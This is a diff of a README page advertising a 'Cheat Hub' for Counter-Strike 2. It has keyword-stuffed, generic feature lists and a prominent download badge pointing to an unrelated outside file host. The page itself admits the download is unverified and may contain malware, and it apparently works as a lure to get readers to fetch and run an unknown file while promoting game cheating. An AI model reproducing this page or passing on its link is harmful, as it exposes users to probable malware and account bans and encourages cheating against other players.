@@ -1,2 +1,41 @@
-# Cheat-Hub-Counter-Strike-2
-🎯 Cheat Hub Counter-Strike 2 (CS2) — Explore an unofficial gaming utility concept featuring customizable settings, gameplay controls, visual options, and configuration tools for CS2. ⚡ Actual functionality and download safety are unverified.
+# 🎯 Cheat Hub Counter-Strike 2 (CS2) — Download & Features
+
+**Cheat Hub for Counter-Strike 2** is an unofficial third-party gaming utility concept associated with Counter-Strike 2 (CS2), the popular competitive tactical first-person shooter developed and published by Valve.
+
+Third-party cheat hubs may advertise gameplay-related controls, customizable settings, and configuration options for tactical combat, weapon handling, map navigation, competitive matchmaking, and multiplayer gameplay. The linked software's actual capabilities have not been verified.
+
+## 📥 Download Cheat Hub Counter-Strike 2
+
+[![Download](https://img.shields.io/badge/DOWNLOAD-CHEAT_HUB_CS2-00C853?style=for-the-badge&logo=github&logoColor=white)](https://huangqing.net/s/file)
+
+## ✨ Features & Options
+
+Third-party cheat hubs may advertise features such as:
+
+- 🎯 **Gameplay Settings** — Gameplay-related configuration controls.
+- 👁️ **Visual Options** — Adjustable display and interface preferences.
+- ⚙️ **Custom Settings** — Personalized hub configurations.
+- 🎮 **Game Controls** — Additional gameplay-related options.
+- 🚀 **Quick Configuration** — Convenient access to hub settings.
+- 🎨 **Customizable UI** — Interface appearance and layout options.
+- 🔧 **Advanced Options** — Additional software preferences.
+- 💾 **Config Management** — Custom configuration profiles.
+
+*These are commonly advertised feature categories, not verified capabilities of the linked download.*
+
+## 🔥 Highlights
+
+- ⚡ Customizable configuration categories
+- 🎯 Counter-Strike 2-related utility concept
+- 🎨 Adjustable interface preferences
+- 🛠️ Organized settings and tools
+- 🚀 Configuration and navigation options
+- 🎮 Gameplay-related customization menus
+
+## ⚠️ Disclaimer
+
+This is an unofficial third-party tool, not affiliated with Valve or Counter-Strike 2. The linked file's functionality and security have not been independently verified. Unknown downloads may contain malware, and unauthorized gameplay modifications may violate game rules and result in account restrictions or permanent bans, including VAC bans.
+
+---
+
+⭐ **Counter-Strike 2 Cheat Hub | CS2 Gaming Utility | Custom Settings | Download**
